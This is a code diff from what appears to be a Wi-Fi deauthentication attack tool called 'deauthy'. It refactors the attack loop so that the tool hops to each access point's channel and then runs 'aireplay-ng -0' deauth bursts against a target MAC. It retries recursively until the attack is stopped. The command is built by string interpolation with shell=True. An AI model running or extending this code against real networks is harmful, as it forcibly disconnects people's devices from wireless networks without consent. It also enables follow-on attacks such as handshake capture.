@@ -95,18 +95,16 @@ class Functs:
     class ChannelSys:
         def hopper(channel_number: int):
             """Hop to a different channel"""
+            from deauthy.functs import get_var
             out = check_call(["airmon-ng", "start", f"{get_var('interface')}", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)
 
     class BSSID_METHOD:
         def deauth(_bssid: BSSID):
             """"""
-            bssi = [] # type: list[str]
-            chns = [] # type: list[str]
-            for key, value in _bssid.bssids.items():
-                bssi.append(key)
-                chns.append(value)
-            
-            def ado_bssid_method(bssid_: str):
+            from deauthy.functs import get_var
+
+            def ado_bssid_method(bssid_: str, channel: int):
+                Functs.ChannelSys.hopper(channel)
                 try:
                     out = check_output(f"""aireplay-ng -0 5 -a {bssid_} -c {get_var('target_mac')} {get_var('interface')}""", shell=True)#, stdout=DEVNULL, stderr=STDOUT)
                     print(f"""==============OUTPUT============\n{out.decode()}\n================================""")
@@ -117,12 +115,13 @@ class Functs:
                     return "stop"
                 except:
                     Functs.BSSID_METHOD.deauth(_bssid=_bssid)
-            
-            for bssid_aa in bssi:
-                status = ado_bssid_method(bssid_aa)
+
+            for bssi, chan in _bssid.bssids.items():
+                status = ado_bssid_method(bssi, chan)
                 if status == "stop":
                     Terminal.inform(f"{Terminal.Light_green+Terminal.Bold+Terminal.Underline}Attack stopped.")
                     return
+
             Functs.BSSID_METHOD.deauth(_bssid=_bssid)
 
 
